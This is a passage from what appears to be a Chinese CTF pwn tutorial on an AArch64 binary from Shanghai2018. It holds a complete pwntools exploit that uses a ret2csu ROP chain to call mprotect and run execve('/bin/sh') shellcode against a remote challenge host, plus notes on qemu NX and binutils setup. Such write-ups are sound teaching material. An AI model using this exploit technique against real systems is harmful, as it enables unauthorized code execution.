.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40
.text:00000000004008DC                 RET

```

最终的 [exp](https://github.com/bash-c/pwn_repo/blob/master/Shanghai2018_baby_arm/solve.py) 如下：

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
context.binary = "./pwn"
context.log_level = "debug"
if sys.argv[1] == "l":
    io = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", "./pwn"])
elif sys.argv[1] == "d":
    io = process(["qemu-aarch64", "-g", "1234", "-L", "/usr/aarch64-linux-gnu", "./pwn"])
else:
    io = remote("106.75.126.171", 33865)
def csu_rop(call, x0, x1, x2):
    payload = flat(0x4008CC, '00000000', 0x4008ac, 0, 1, call)
    payload += flat(x2, x1, x0)
    payload += '22222222'
    return payload
if __name__ == "__main__":
    elf = ELF("./pwn", checksec = False)
    padding = asm('mov x0, x0')
    sc = asm(shellcraft.execve("/bin/sh"))
    #  print disasm(padding * 0x10 + sc)
    io.sendafter("Name:", padding * 0x10 + sc)
    sleep(0.01)
    #  io.send(cyclic(length = 500, n = 8))
    #  rop = flat()
    payload = flat(cyclic(72), csu_rop(elf.got['read'], 0, elf.got['__gmon_start__'], 8))
    payload += flat(0x400824)
    io.send(payload)
    sleep(0.01)
    io.send(flat(elf.plt['mprotect']))
    sleep(0.01)
    raw_input("DEBUG: ")
    io.sendafter("Name:", padding * 0x10 + sc)
    sleep(0.01)
    payload = flat(cyclic(72), csu_rop(elf.got['__gmon_start__'], 0x411000, 0x1000, 7))
    payload += flat(0x411068)
    sleep(0.01)
    io.send(payload)
    io.interactive()

```

### notice

同时需要注意的是，`checksec` 检测的结果是开了 nx 保护，但这样检测的结果不一定准确，因为程序的 nx 保护也可以通过 qemu 启动时的参数 `-nx` 来决定（比如这道题目就可以通过远程失败时的报错发现程序开了 nx 保护），老版的 qemu 可能没有这个参数。

```
Desktop ./qemu-aarch64 --version
qemu-aarch64 version 2.7.0, Copyright (c) 2003-2016 Fabrice Bellard and the QEMU Project developers
Desktop ./qemu-aarch64 -h| grep nx
-nx           QEMU_NX           enable NX implementation

```

如果有如下的报错，说明没有 aarch64 的汇编器

```
[ERROR] Could not find 'as' installed for ContextType(arch = 'aarch64', binary = ELF('/home/m4x/Projects/ctf-challenges/pwn/arm/Shanghai2018_baby_arm/pwn'), bits = 64, endian = 'little', log_level = 10)
    Try installing binutils for this architecture:
    https://docs.pwntools.com/en/stable/install/binutils.html

```

可以参考官方文档的解决方案

```
Shanghai2018_baby_arm [master●] apt search binutils| grep aarch64
p   binutils-aarch64-linux-gnu                                         - GNU binary utilities, for aarch64-linux-gnu target
p   binutils-aarch64-linux-gnu:i386                                    - GNU binary utilities, for aarch64-linux-gnu target
p   binutils-aarch64-linux-gnu-dbg                                     - GNU binary utilities, for aarch64-linux-gnu target (debug symbols)
p   binutils-aarch64-linux-gnu-dbg:i386                                - GNU binary utilities, for aarch64-linux-gnu target (debug symbols)
Shanghai2018_baby_arm [master●] sudo apt install bintuils-aarch64-linux-gnu

```

> aarch64 的文件在装 libc 时是 `arm64`，在装 `binutils` 时是 `aarch64`

例题
--

Codegate2015 - melong

参考文献
----

[http://www.freebuf.com/articles/terminal/134980.html](http://www.freebuf.com/articles/terminal/134980.html)

[img-0]:data:image/png;base64,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

[img-1]:data:image/png;base64,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